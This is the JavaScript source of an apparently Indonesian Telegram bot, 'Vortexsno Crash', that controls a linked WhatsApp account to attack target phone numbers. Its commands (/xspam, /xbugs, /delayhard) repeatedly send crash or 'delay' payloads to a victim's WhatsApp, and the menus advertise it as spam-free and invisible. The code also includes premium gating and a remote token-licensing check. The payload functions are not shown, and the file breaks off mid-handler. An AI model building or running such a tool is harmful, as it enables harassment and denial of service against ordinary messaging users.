const { Telegraf, Markup, session } = require("telegraf"); 
const fs = require("fs");
const path = require("path");
const moment = require("moment-timezone");
const {
  makeWASocket,
  makeInMemoryStore,
  fetchLatestBaileysVersion,
  useMultiFileAuthState,
  DisconnectReason,
  generateWAMessageFromContent,
  generateWAMessage,
} = require("@whiskeysockets/baileys");
const pino = require("pino");
const chalk = require("chalk");
const axios = require("axios");
const readline = require('readline');
const { BOT_TOKEN, OWNER_IDS } = require("./config.js");
const crypto = require("crypto");

// ========== DEKLARASI VARIABEL GLOBAL ==========
const sessionPath = './session';
let bots = [];
const bot = new Telegraf(BOT_TOKEN);
const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// === Path File ===
const premiumFile = "./Database/premiums.json";
const adminFile = "./Database/admins.json";
const dbPath = "./Database/ControlCommand.json";
const premiumGroupFile = "./Database/premiumgrup.json";

// Pastikan folder Database ada
if (!fs.existsSync("./Database")) {
  fs.mkdirSync("./Database", { recursive: true });
}

// ========== VARIABEL WHATSAPP (DIPERBAIKI) ==========
let sock = null;
let isWhatsAppConnected = false;
let linkedWhatsAppNumber = "";
let pairingMessage = null;      // <-- HARUS ADA untuk menyimpan data pairing
let waStatus = "🔴 Tidak Terhubung";  // <-- HARUS ADA untuk status
const usePairingCode = true;
// === Fungsi Load & Save JSON ===
const loadJSON = (filePath) => {
  try {
    if (!fs.existsSync(filePath)) {
      fs.writeFileSync(filePath, JSON.stringify([]));
      return [];
    }
    const data = fs.readFileSync(filePath);
    return JSON.parse(data);
  } catch (err) {
    console.error(chalk.red(`Gagal memuat file ${filePath}:`), err);
    return [];
  }
};

const saveJSON = (filePath, data) => {
  fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
};

function loadDB() {
  if (!fs.existsSync(dbPath)) return { groupCmdBlock: {} }
  return JSON.parse(fs.readFileSync(dbPath))
}

function saveDB(data) {
  fs.writeFileSync(dbPath, JSON.stringify(data, null, 2))
}

if (!fs.existsSync(dbPath)) {
  fs.writeFileSync(dbPath, JSON.stringify({ groupCmdBlock: {} }, null, 2));
}

// === Load Semua Data Saat Startup ===
let adminUsers = loadJSON(adminFile);
let premiumUsers = loadJSON(premiumFile);
let premiumGroups = loadJSON(premiumGroupFile);

// === Middleware Role ===
const checkOwner = (ctx, next) => {
  const userId = ctx.from.id.toString(); 
  if (!OWNER_IDS.includes(userId)) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Owner");
  }
  return next();
};

const checkAdmin = (ctx, next) => {
  if (!adminUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Admin.");
  }
  next();
};

const checkPremium = (ctx, next) => {
  if (!premiumUsers.includes(ctx.from.id.toString())) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Premium.");
  }
  next();
};

function isPremiumGroup(chatId) {
  return (
    global.db?.premiumGroups?.includes(String(chatId))
  );
}

const checkPremiumGroup = (ctx, next) => {
  const groupId = ctx.chat.id.toString();

  if (!global.db?.premiumGroups?.includes(groupId)) {
    return ctx.reply("❗ Mohon Maaf Fitur Ini Khusus Grup Premium.");
  }

  next();
};

const removePremiumGroup = (groupId) => {
  premiumGroups = premiumGroups.filter(id => id !== groupId);
  saveJSON(premiumGroupFile, premiumGroups);
};

const checkWhatsAppConnection = (ctx, next) => {
  if (!isWhatsAppConnected) {
    ctx.reply("❌ WhatsApp Belum terhubung, gunakan /addbot terlebih dahulu");
    return;
  }
  next();
};

const checkCommandEnabled = async (ctx, next) => {
  if (!ctx.message?.text) return next();
  const text = ctx.message.text.trim();
  if (!text.startsWith("/")) return next();
  let cmd = text.split(" ")[0].toLowerCase();
  if (cmd.includes("@")) {
    cmd = cmd.split("@")[0];
  }
  const db = loadDB();
  const chatId = String(ctx.chat.id);
  const blocked = db.groupCmdBlock?.[chatId] || [];
  const normalizedBlocked = blocked.map(c => c.toLowerCase().split("@")[0]);
  if (normalizedBlocked.includes(cmd)) {
    return ctx.reply("⛔ Command ini diblokir di grup ini.");
  }
  return next();
};

// === Fungsi Admin / Premium ===
const addAdmin = (userId) => {
  if (!adminUsers.includes(userId)) {
    adminUsers.push(userId);
    saveJSON(adminFile, adminUsers);
  }
};

const removeAdmin = (userId) => {
  adminUsers = adminUsers.filter((id) => id !== userId);
  saveJSON(adminFile, adminUsers);
};

const addpremium = (userId) => {
  if (!premiumUsers.includes(userId)) {
    premiumUsers.push(userId);
    saveJSON(premiumFile, premiumUsers);
  }
};

const removePremium = (userId) => {
  premiumUsers = premiumUsers.filter((id) => id !== userId);
  saveJSON(premiumFile, premiumUsers);
};

bot.use(session());

///////// RANDOM IMAGE \\\\\\\\\
const randomImages = [
  "https://files.catbox.moe/t4b7ma.jpg",
  "https://files.catbox.moe/t4b7ma.jpg",
];

const getRandomImage = () =>
  randomImages[Math.floor(Math.random() * randomImages.length)];

// Fungsi untuk mendapatkan waktu uptime
const getUptime = () => {
  const uptimeSeconds = process.uptime();
  const hours = Math.floor(uptimeSeconds / 3600);
  const minutes = Math.floor((uptimeSeconds % 3600) / 60);
  const seconds = Math.floor(uptimeSeconds % 60);
  return `${hours}h ${minutes}m ${seconds}s`;
};

// file db token
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/AzamzChiverzz/database/main/tokens.json";

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    if (Array.isArray(response.data.tokens)) {
      return response.data.tokens; // ambil dari object 'tokens'
    } else {
      console.error(chalk.red("❌ Format data di GitHub salah! Key 'tokens' harus array"));
      return [];
    }
  } catch (error) {
    console.error(chalk.red("ʟᴜ sᴘ anjir🤭😹😹, ᴛᴏᴋᴇɴ ʟᴜ ʟᴏᴍ ᴋᴇᴅᴀғᴛᴀʀ ᴅɪ ᴅʙ ᴍɪɴᴛᴀ sᴇʟʟᴇʀ ʟᴜ ᴋᴀʟᴏ ʟᴜ bel😹😹:", error.message));
    return [];
  }
}

// Validasi token
async function validateToken() {
  console.log(chalk.yellow("⏳ Loading Check Token Bot..."));

  const validTokens = await fetchValidTokens();

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("❌ ʟᴜ sɪᴀᴘᴀ ᴋᴏɴᴛᴏʟ ᴍᴀᴜ ɴɢᴇᴄʀᴀᴄᴋ ʏᴀ?! 😹😹"));
    process.exit(1);
  }

  console.log(chalk.green("✅ ᴋᴇʟᴀᴢ ʟᴇᴋ ᴛᴏᴋᴇɴᴍᴜ ᴍᴀsᴜᴋ ᴅɪ ᴅʙ"));
  startBot();
}

function startBot() {
  console.clear();
  console.log(chalk.bold.red(`==============================================
 
⠛⠛⣿⣿⣿⣿⣿⡷⢶⣦⣶⣶⣤⣤⣤⣀⠀⠀⠀
 ⠀⠀⠀⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⡀⠀
 ⠀⠀⠀⠉⠉⠉⠙⠻⣿⣿⠿⠿⠛⠛⠛⠻⣿⣿⣇⠀
 ⠀⠀⢤⣀⣀⣀⠀⠀⢸⣷⡄⠀⣁⣀⣤⣴⣿⣿⣿⣆
 ⠀⠀⠀⠀⠹⠏⠀⠀⠀⣿⣧⠀⠹⣿⣿⣿⣿⣿⡿⣿
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠛⠿⠇⢀⣼⣿⣿⠛⢯⡿⡟
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠦⠴⢿⢿⣿⡿⠷⠀⣿⠀
 ⠀⠀⠀⠀⠀⠀⠀⠙⣷⣶⣶⣤⣤⣤⣤⣤⣶⣦⠃⠀
 ⠀⠀⠀⠀⠀⠀⠀⢐⣿⣾⣿⣿⣿⣿⣿⣿⣿⣿⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠈⣿⣿⣿⣿⣿⣿⣿⣿⣿⡇⠀⠀
 ⠀⠀⠀⠀⠀⠀⠀⠀⠀⠙⠻⢿⣿⣿⣿⣿⠟⠁

  `));
  console.log(
    chalk.bold.green(`
KLZZ, TOKEN ELU KE DAFTAR 🥶
==============================
Vortexsno Crash  BEBAS SPAM
`));
}

startBot();

// WhatsApp Connection
const store = makeInMemoryStore({ logger: pino().child({ level: 'silent', stream: 'store' }) });

const startSesi = async () => {
  const { state, saveCreds } = await useMultiFileAuthState('./session');
  const { version } = await fetchLatestBaileysVersion();

  const connectionOptions = {
    version,
    keepAliveIntervalMs: 30000,
    printQRInTerminal: false,
    logger: pino({ level: "silent" }),
    auth: state,
    browser: ['Mac OS', 'Safari', '10.15.7'],
    getMessage: async (key) => ({
      conversation: 'P',
    }),
  };

  sock = makeWASocket(connectionOptions);
  sock.ev.on('creds.update', saveCreds);
  store.bind(sock.ev);
  
  sock.ev.on('connection.update', async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === 'open') {
      isWhatsAppConnected = true;
      waStatus = "🟢 Terhubung";
      
      // DAPATKAN NOMOR YANG TERHUBUNG
      if (sock.user) {
        linkedWhatsAppNumber = sock.user.id?.split('@')[0] || "Tidak diketahui";
      }
      
      // UPDATE PESAN PAIRING JIKA ADA
      if (pairingMessage) {
        try {
          await bot.telegram.editMessageCaption(
            pairingMessage.chatId,
            pairingMessage.messageId,
            undefined,
            `
<blockquote>
┏━━━━━━━━━━━━━━━━━━━━
┃ ☇ Status : 🟢 TERHUBUNG
┃ ☇ Nomor  : ${pairingMessage.phoneNumber}
┃ ☇ Code   : <code>${pairingMessage.code}</code>
┗━━━━━━━━━━━━━━━━━━━━
</blockquote>

✅ Berhasil terhubung!
`,
            { parse_mode: "HTML" }
          );
        } catch(e) {
          console.log("Gagal update pairing message:", e.message);
        }
      }
      
      console.log(chalk.green.bold(`
╭─────────────────────────────╮
│ ${chalk.white('✓ Berhasil Tersambung ke WhatsApp')}
│ ${chalk.white('✓ Nomor: ' + linkedWhatsAppNumber)}
╰─────────────────────────────╯`));
    }

    if (connection === 'close') {
      isWhatsAppConnected = false;
      waStatus = "🔴 Tidak Terhubung";
      linkedWhatsAppNumber = "";
      
      const shouldReconnect = lastDisconnect?.error?.output?.statusCode !== DisconnectReason.loggedOut;
      console.log(chalk.red.bold(`
╭─────────────────────────────╮
│ ${chalk.white('WhatsApp Terputus')}
╰─────────────────────────────╯`));

      if (shouldReconnect) {
        console.log(chalk.yellow.bold(`
╭─────────────────────────────╮
│ ${chalk.white('Menyambung kembali...')}
╰─────────────────────────────╯`));
        setTimeout(() => startSesi(), 3000);
      }
    }
  });
};
  
//TARO DI ATAS
async function checkChannelMembership(ctx) {
  const channelId = "@AboutAzamz"; // ganti sesuai channel kamu
  try {
    const chatMember = await ctx.telegram.getChatMember(channelId, ctx.from.id);
    return ["member", "administrator", "creator"].includes(chatMember.status);
  } catch (error) {
    console.error("Gagal cek membership:", error.message);
    return false;
  }
}

////=========MENU UTAMA========\\\\
const buttonStyles = ["Primary", "Success", "Danger"];
let menuAnimation = null;

function generateMenuKeyboard(style) {
  return [
    [
      {
        text: "ꜱᴇᴛɪɴɢꜱ",
        callback_data: "owner_menu",
        style,
      },
      {
        text: "ᴀᴛᴛᴀᴄᴋ ",
        callback_data: "bug_menu",
        style,
      },
      {
        text: "ᴛᴏᴏʟꜱ",
        callback_data: "tools_menu",
        style,
      },
    ],
    [
      {
        text: "ᴅᴇᴠᴇʟᴏᴘᴇʀ",
        url: "https://t.me/AzamzChiverz",
        style,
      },
      {
        text: "ɪɴꜰᴏʀᴍᴀꜱɪ",
        url: "https://t.me/AboutAzamz",
        style,
      },
    ],
    [
      {
        text: "ᴛQᴛᴏ",
        callback_data: "tqto",
        style,
      },
    ],
  ];
}


bot.start(async (ctx) => {

  const ownerId = OWNER_IDS[0]; // owner pertama

  await ctx.telegram.sendMessage(
  ownerId,
  `\`\`\`JavaScript
📢 User baru menjalankan bot

👤 Nama: ${ctx.from.first_name}
📝 Username: ${ctx.from.username ? "@" + ctx.from.username : "-"}
🆔 ID: ${ctx.from.id}
\`\`\``,
  { parse_mode: "Markdown" }
).catch(() => {});

  const isMember = await checkChannelMembership(ctx);

  if (!isMember) {
    return ctx.reply(
      `\`\`\`
TERDETEKSI KAMU BELUM BERGABUNG KE
DALAM CHANNEL TELEGRAM!!

SILAHKAN CLICK BUTTON DI BAWAH
UNTUK BERGABUNG 👇
\`\`\``,
      {
        parse_mode: "Markdown",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "📢 JOIN CHANNEL",
                url: "https://t.me/AboutAzamz",
              },
            ],
            [
              {
                text: "🔄 REFRESH",
                callback_data: "refresh_start",
              },
            ],
          ],
        },
      }
    );
  }

  if (menuAnimation) {
    clearInterval(menuAnimation);
    menuAnimation = null;
  }

  global.buttonColorIndex = global.buttonColorIndex || 0;

  const currentStyle =
    buttonStyles[global.buttonColorIndex];

  global.buttonColorIndex =
    (global.buttonColorIndex + 1) %
    buttonStyles.length;

  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);

  const Name = ctx.from.username
    ? `@${ctx.from.username}`
    : userId;

  const waktuRunPanel = getUptime();

  const wastatus = isWhatsAppConnected ? "ᴛᴇʀʜᴜʙᴜɴɢ" : "ᴛɪᴅᴀᴋ ᴛᴇʀʜᴜʙᴜɴɢ";


  const mainMenuMessage = `\`\`\`JavaScript
⬡═―⧼ Vσɾƚҽxʂɳσ-Cɾαʂԋ ⧽―═⬡
◉ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @AzamzChiverz
◉ ᴠᴇʀꜱɪᴏɴ : 3.0 
◉ ᴛʏᴘᴇ : ʙᴇʙᴀꜱ ꜱᴘᴀᴍ
◉ ᴘʀᴇꜰɪx : ( / )

⬡═―⧼ Sƚαƚυʂ Bσƚ ⧽―═⬡
◉ ᴜꜱᴇʀɴᴀᴍᴇ : ${Name}
◉ ᴜꜱᴇʀ-ɪᴅ : ${userId}
◉ sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${wastatus}
◉ ʀᴜɴᴛɪᴍᴇ : ${waktuRunPanel}
( Ϟ ) Please select a button menu below!!\`\`\``;

  const mainKeyboard =
    generateMenuKeyboard(currentStyle);

  const sent = await ctx.replyWithPhoto(
    getRandomImage(),
    {
      caption: mainMenuMessage,
      parse_mode: "Markdown",
      reply_markup: {
        inline_keyboard: mainKeyboard,
      },
    }
  );

  menuAnimation = setInterval(async () => {
    try {
      global.buttonColorIndex =
        (global.buttonColorIndex + 1) %
        buttonStyles.length;

      const style =
        buttonStyles[
          global.buttonColorIndex
        ];

      await ctx.telegram.editMessageReplyMarkup(
        ctx.chat.id,
        sent.message_id,
        undefined,
        {
          inline_keyboard:
            generateMenuKeyboard(style),
        }
      );
    } catch (err) {
      clearInterval(menuAnimation);
      menuAnimation = null;
    }
  }, 2000);
});

//handler buat join ch
bot.action("refresh_start", async (ctx) => {
  const isMember = await checkChannelMembership(ctx);

  if (!isMember) {
    return ctx.answerCbQuery("❌ Kamu belum join channel!", {
      show_alert: true,
    });
  }

  await ctx.answerCbQuery("✅ Berhasil diverifikasi!");
  await ctx.deleteMessage();

  // Tampilkan menu utama
  ctx.reply("Selamat datang di bot! silahkan start ulang ya");
});

// Handler untuk owner_menu
bot.action("owner_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});


  // Stop animasi menu utama
  if (menuAnimation) {
    clearInterval(menuAnimation);
    menuAnimation = null;
  }

  const mainMenuMessage = `\`\`\`JavaScript
⬡═―⧼ sєttíngs-mєnu ɠɾσυρ  ⧽―═⬡
☇ - /blockcmd 
☇ - /unblockcmd 
☇ - /listblockcmd
☇ - /addpremgrup
☇ - /delpremgrup

⬡═―⧼ ąƙʂɛʂ-ɱɛŋų ⧽―═⬡
☇ - /addprem 
☇ - /delprem 
☇ - /cekprem
☇ - /addadmin
☇ - /deladmin

⬡═―⧼ ʂɛɬıŋɠ-ცơɬ ɱɛŋų ⧽―═⬡
☇ - /status
☇ - /addbot
☇ - /delbot
☇ - /anticulik
☇ - /update
\`\`\``;
  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown",
  };

const keyboard = {
  inline_keyboard: [
    [
      {
        text: "「 ʙᴀᴄᴋ 」",
        callback_data: "back",
        style: buttonStyles[
          global.buttonColorIndex || 0
        ],
      },
    ],
  ],
};

  try {
    if (ctx.callbackQuery?.message) {
      await ctx.editMessageMedia(media, {
        reply_markup: keyboard,
      });
    } else {
      throw new Error("No callback message");
    }
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});
// Handler unbug_bug_menu
bot.action("bug_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});


  // Stop animasi menu utama
  if (menuAnimation) {
    clearInterval(menuAnimation);
    menuAnimation = null;
  }

  const mainMenuMessage = `\`\`\`JavaScript
━━━━━━━━━━━━━━━━━━━━━━━
   BUG CATEGORIES MENU
━━━━━━━━━━━━━━━━━━━━━━━

Silahkan pilih jenis kategori bug
yang ingin kamu gunakan.

━━━━━━━━━━━━━━━━━━━━━━━
Powerful • High Performance
Full Feature • Premium Script
━━━━━━━━━━━━━━━━━━━━━━━
- [ BEBAS SPAM ] -
➤ Untuk Murbug
➤ Dapat digunakan untuk spam
➤ Mode Invible (tidak terlihat)
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown",
  };

  const keyboard = {
  inline_keyboard: [
    [
      {
        text: "「 ʙᴇʙᴀꜱ ꜱᴘᴀᴍ 」",
        callback_data: "trash2",
        style: buttonStyles[
          global.buttonColorIndex || 0
        ],
      },
    ],
  ],
};

  try {
    if (ctx.callbackQuery?.message) {
      await ctx.editMessageMedia(media, {
        reply_markup: keyboard,
      });
    } else {
      throw new Error("No callback message");
    }
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

// Handler trash2
bot.action("trash2", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});
  

  if (menuAnimation) {
    clearInterval(menuAnimation);
    menuAnimation = null;
  }

  const mainMenuMessage = `\`\`\`JavaScript
⬡═―⧼ 𝙱𝚎𝚋𝚊𝚜 𝚂𝚙𝚊𝚖 𝙼𝚎𝚗𝚞 ⧽―═⬡
☇ - /xbugs ᝄ Delay For Murbug
☇ - /xspam ᝄ Delay For Murbug
☇ - /delayhard ᝄ Delay For Murbug
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown",
  };

  const keyboard = {
  inline_keyboard: [
    [
      {
        text: "「 ʙᴀᴄᴋ 」",
        callback_data: "back",
        style: buttonStyles[
          global.buttonColorIndex || 0
        ],
      },
    ],
  ],
};

  try {
    if (ctx.callbackQuery?.message) {
      await ctx.editMessageMedia(media, {
        reply_markup: keyboard,
      });
    } else {
      throw new Error("No callback message");
    }
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

// Handler tqto menu
bot.action("tqto", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});


  if (menuAnimation) {
    clearInterval(menuAnimation);
    menuAnimation = null;
  }

  const mainMenuMessage = `\`\`\`JavaScript
─ 𝕿𝖍𝖆𝖓𝖐𝖘 𝖙𝖔° ─( 🫀 )
┃☰. @AzamzChiverz
〢-╰➤ ° ↯ Developer Script
┃☰. Apiman
〢-╰➤ ° ↯ Friends
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown",
  };

  const keyboard = {
  inline_keyboard: [
    [
      {
        text: "「 ʙᴀᴄᴋ 」",
        callback_data: "back",
        style: buttonStyles[
          global.buttonColorIndex || 0
        ],
      },
    ],
  ],
};

  try {
    if (ctx.callbackQuery?.message) {
      await ctx.editMessageMedia(media, {
        reply_markup: keyboard,
      });
    } else {
      throw new Error("No callback message");
    }
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

// Handler Tools Menu
bot.action("tools_menu", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});


  // Stop animasi menu utama
  if (menuAnimation) {
    clearInterval(menuAnimation);
    menuAnimation = null;
  }

  const mainMenuMessage = `\`\`\`JavaScript
『 𝚃𝚘𝚘𝚕𝚜 𝟷 』

ヤ /cqr - Create Qr
ヤ /tekateki - Teka Teki
ヤ /countryinfo - Country Info
ヤ /tourl - To Url
ヤ /ceknum - Cek Nomor
ヤ /ceknegara - Cek Negara
ヤ /toanime - To Anime
ヤ /cekid - Cek Id
ヤ /iqc - Iqc
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown",
  };

  const keyboard = {
  inline_keyboard: [
    [
      {
        text: "「 ɴᴇxᴛ 」",
        callback_data: "tools",
        style: buttonStyles[
          global.buttonColorIndex || 0
        ],
      },
    ],
  ],
};

  try {
    if (ctx.callbackQuery?.message) {
      await ctx.editMessageMedia(media, {
        reply_markup: keyboard,
      });
    } else {
      throw new Error("No callback message");
    }
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

// 𝚑𝚊𝚗𝚍𝚕𝚎𝚛 𝚝𝚘𝚘𝚕𝚜 𝟸
bot.action("tools", async (ctx) => {
  await ctx.answerCbQuery().catch(() => {});

  const Name = ctx.from.username
    ? `@${ctx.from.username}`
    : `${ctx.from.id}`;

  const waktuRunPanel = getUptime();

const wastatus = isWhatsAppConnected ? "ᴛᴇʀʜᴜʙᴜɴɢ" : "ᴛɪᴅᴀᴋ ᴛᴇʀʜᴜʙᴜɴɢ";


  if (menuAnimation) {
    clearInterval(menuAnimation);
    menuAnimation = null;
  }

  const mainMenuMessage = `\`\`\`JavaScript
『 𝚃𝚘𝚘𝚕𝚜 𝟸 』
ヤ /play - Play Music
ヤ /brat - Brat Sticker
ヤ /tiktok - Download Video Tiktok
ヤ /cekfunc - Cek Function
ヤ /statuswebsite - Cek Status Website
\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown",
  };

const keyboard = {
  inline_keyboard: [
    [
      {
        text: "「 ʙᴀᴄᴋ 」",
        callback_data: "back",
        style: buttonStyles[
          global.buttonColorIndex || 0
        ],
      },
    ],
  ],
};

  try {
    if (ctx.callbackQuery?.message) {
      await ctx.editMessageMedia(media, {
        reply_markup: keyboard,
      });
    } else {
      throw new Error("No callback message");
    }
  } catch (err) {
    await ctx.replyWithPhoto(media.media, {
      caption: media.caption,
      parse_mode: media.parse_mode,
      reply_markup: keyboard,
    });
  }
});

// Handler untuk back main menu
bot.action("back", async (ctx) => {
  await ctx.answerCbQuery();

  if (menuAnimation) {
    clearInterval(menuAnimation);
    menuAnimation = null;
  }

  global.buttonColorIndex = global.buttonColorIndex || 0;

  const currentStyle =
    buttonStyles[global.buttonColorIndex];

  global.buttonColorIndex =
    (global.buttonColorIndex + 1) %
    buttonStyles.length;
  
  const userId = ctx.from.id.toString();
  const isPremium = premiumUsers.includes(userId);

  const Name = ctx.from.username
    ? `@${ctx.from.username}`
    : userId;

  const waktuRunPanel = getUptime();

const wastatus = isWhatsAppConnected ? "ᴛᴇʀʜᴜʙᴜɴɢ" : "ᴛɪᴅᴀᴋ ᴛᴇʀʜᴜʙᴜɴɢ";


  const mainMenuMessage = `\`\`\`JavaScript
⬡═―⧼ Vσɾƚҽxʂɳσ-Cɾαʂԋ ⧽―═⬡
◉ ᴅᴇᴠᴇʟᴏᴘᴇʀ : @AzamzChiverz
◉ ᴠᴇʀꜱɪᴏɴ : 3.0 
◉ ᴛʏᴘᴇ : ʙᴇʙᴀꜱ ꜱᴘᴀᴍ
◉ ᴘʀᴇꜰɪx : ( / )

⬡═―⧼ Sƚαƚυʂ Bσƚ ⧽―═⬡
◉ ᴜꜱᴇʀɴᴀᴍᴇ : ${Name}
◉ ᴜꜱᴇʀ-ɪᴅ : ${userId}
◉ sᴛᴀᴛᴜs sᴇɴᴅᴇʀ : ${wastatus}
◉ ʀᴜɴᴛɪᴍᴇ : ${waktuRunPanel}
( Ϟ ) Please select a button menu below!!\`\`\``;

  const media = {
    type: "photo",
    media: getRandomImage(),
    caption: mainMenuMessage,
    parse_mode: "Markdown",
  };

  const mainKeyboard =
    generateMenuKeyboard(currentStyle);

  try {
    await ctx.editMessageMedia(
      media,
      {
        reply_markup: {
          inline_keyboard: mainKeyboard,
        },
      }
    );

    const messageId =
      ctx.callbackQuery.message.message_id;

    menuAnimation = setInterval(async () => {
      try {
        global.buttonColorIndex =
          (global.buttonColorIndex + 1) %
          buttonStyles.length;

        const style =
          buttonStyles[
            global.buttonColorIndex
          ];

        await ctx.telegram.editMessageReplyMarkup(
          ctx.chat.id,
          messageId,
          undefined,
          {
            inline_keyboard:
              generateMenuKeyboard(style),
          }
        );
      } catch {}
    }, 2000);

  } catch (err) {
    const sent = await ctx.replyWithPhoto(
      media.media,
      {
        caption: media.caption,
        parse_mode: media.parse_mode,
        reply_markup: {
          inline_keyboard: mainKeyboard,
        },
      }
    );

    menuAnimation = setInterval(async () => {
      try {
        global.buttonColorIndex =
          (global.buttonColorIndex + 1) %
          buttonStyles.length;

        const style =
          buttonStyles[
            global.buttonColorIndex
          ];

        await ctx.telegram.editMessageReplyMarkup(
          ctx.chat.id,
          sent.message_id,
          undefined,
          {
            inline_keyboard:
              generateMenuKeyboard(style),
          }
        );
      } catch {}
    }, 1500);
  }
});

//==== Cek Join Ch Sebelum Bug====\\
async function checkChannelMembershipbug(ctx, next) {
  const channelId = "@AboutAzamz";

  try {
    const member = await ctx.telegram.getChatMember(
      channelId,
      ctx.from.id
    );

    const allowed = [
      "member",
      "administrator",
      "creator"
    ];

    if (!allowed.includes(member.status)) {
      return ctx.reply(
        "❌ Kamu wajib join channel terlebih dahulu!",
        {
          reply_markup: {
            inline_keyboard: [
              [
                {
                  text: "📢 Join Channel",
                  url: "https://t.me/AboutAzamz"
                }
              ]
            ]
          }
        }
      );
    }

    return next(); // lanjut ke command
  } catch (err) {
    return ctx.reply("❌ Gagal mengecek status channel.");
  }
}

// ---CASE BUG DELAY BEBAS SPAM---\\   
bot.command("xspam", checkWhatsAppConnection, checkPremiumGroup,checkChannelMembershipbug, checkCommandEnabled, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xspam 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`✅ Target Telah Tumbang: ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "☇ Check Target",
                url: `https://wa.me/${q}`,
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 5; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY HARD TO: ${q} ]`)
        );
        await Conghard(sock, target);
        await DelayVisible(sock, target);
        await DelayExelion(sock, target);
        await sleep(1000);
      }
    })();

  }
);

bot.command("xbugs", checkWhatsAppConnection, checkPremiumGroup,checkChannelMembershipbug, checkCommandEnabled, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /xbugs 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.replyWithHTML(
`✅ Target Telah Tumbang: ${q}`,
      {
        parse_mode: "HTML",
        reply_markup: {
          inline_keyboard: [
            [
              {
                text: "☇ Check Target",
                url: `https://wa.me/${q}`,
                style: "danger"
              }
            ]
          ]
        }
      }
    );

    (async () => {
      for (let i = 0; i < 10; i++) {
        console.log(
          chalk.red(`[ SENDING DELAY BEBAS SPAM TO: ${q} ]`)
        );
        await Conghard(sock, target);
        await DelayVisible(sock, target);
        await DelayExelion(sock, target);
        await sleep(1000);
      }
    })();

  }
);

//
bot.command("delayhard", checkWhatsAppConnection, checkPremiumGroup,checkChannelMembershipbug, checkCommandEnabled, async (ctx) => {

    const username = ctx.from.username
      ? `@${ctx.from.username}`
      : ctx.from.first_name || "User";

    const q = ctx.message.text.split(" ")[1];

    if (!q) {
      return ctx.reply("🪧 Example: /delayhard 62xxxx");
    }

    const target = q.replace(/[^0-9]/g, "") + "@s.whatsapp.net";

    await ctx.reply(
`\`\`\`Vσɾƚҽxʂɳσ-Cɾαʂԋ\`\`\`\`\`\`
ᴛᴀʀɢᴇᴛ : ${q}
ᴛʏᴘᴇ ʙᴜɢ : ᴅᴇʟᴀʏ ꜱᴜᴘᴇʀ ʜᴀʀᴅ
sᴛᴀᴛᴜs : sᴜᴄᴄᴇss

⚠️ ᴊᴀɴɢᴀɴ ᴘᴀᴋᴀɪ ʙᴜɢ ɪɴɪ ᴜɴᴛᴜᴋ
ᴋᴇᴊᴀʜᴀᴛᴀɴ ᴋᴀʀᴇɴᴀ ᴅᴀᴘᴀᴛ ᴍᴇʀɪɢᴜᴋᴀɴ
ᴏʀᴀɴɢ ʏᴀɴɢ ᴛɪᴅᴀᴋ ʙᴇʀsᴀʟᴀʜ!!!\`\`\``,
{
  parse_mode: "Markdown",
  reply_markup: {
    inline_keyboard: [
      [
        {
          text: "☇ Check Target",
